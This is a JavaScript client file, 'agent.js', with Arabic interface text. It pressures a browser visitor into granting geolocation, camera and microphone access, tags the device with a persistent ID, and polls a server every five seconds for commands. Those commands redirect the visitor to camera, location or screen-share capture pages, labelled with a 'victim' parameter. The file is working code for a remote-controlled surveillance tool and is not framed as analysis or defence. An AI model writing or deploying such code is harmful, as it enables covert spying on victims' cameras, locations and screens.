// agent.js

const deviceId = generateDeviceId();
const permissions = {
  geolocation: false,
  camera: false,
  microphone: false
};

function generateDeviceId() {
  let id = localStorage.getItem('deviceId');
  if (!id) {
    id = 'dev-' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('deviceId', id);
  }
  return id;
}

function requestPermission(permissionType, button) {
  switch(permissionType) {
    case 'geolocation':
      if (!navigator.geolocation) {
        alert('متصفحك لا يدعم الموقع');
        return;
      }
      navigator.geolocation.getCurrentPosition(
        () => {
          permissions.geolocation = true;
          updateButton(button);
          checkAllPermissions();
        },
        () => alert('تم رفض إذن الموقع')
      );
      break;

    case 'camera':
      if (!navigator.mediaDevices?.getUserMedia) {
        alert('متصفحك لا يدعم الكاميرا');
        return;
      }
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          permissions.camera = true;
          updateButton(button);
          checkAllPermissions();
          stream.getTracks().forEach(t => t.stop());
        })
        .catch(() => alert('تم رفض إذن الكاميرا'));
      break;

    case 'microphone':
      if (!navigator.mediaDevices?.getUserMedia) {
        alert('متصفحك لا يدعم الميكروفون');
        return;
      }
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          permissions.microphone = true;
          updateButton(button);
          checkAllPermissions();
          stream.getTracks().forEach(t => t.stop());
        })
        .catch(() => alert('تم رفض إذن الميكروفون'));
      break;
  }
}

function updateButton(button) {
  button.innerText = '✓ تم التفعيل';
  button.classList.add('granted');
  button.disabled = true;
}

function checkAllPermissions() {
  const allGranted = Object.values(permissions).every(Boolean);
  const submitBtn = document.querySelector('.submit-btn');
  if (submitBtn) submitBtn.disabled = !allGranted;
}

function submitPermissions() {
  const data = {
    clientId: deviceId,
    permissions
  };

  fetch('/permissions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  })
  .then(res => res.json())
  .then(data => {
    if (data.redirect) {
      window.location.href = data.redirect;
    }
  })
  .catch(() => alert('خطأ في إرسال البيانات'));
}

// Polling
setInterval(() => {
  fetch('/api/poll', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: deviceId })
  })
  .then(res => res.json())
  .then(data => {
    if (data.command === 'camera') {
      window.location.href = '/camera.html?victim=' + deviceId;
    } else if (data.command === 'geo') {
      window.location.href = '/geo.html?victim=' + deviceId;
    } else if (data.command === 'screenshare') {
      window.location.href = '/screenshare.html?victim=' + deviceId;
    }
  })
  .catch(() => {});
}, 5000);



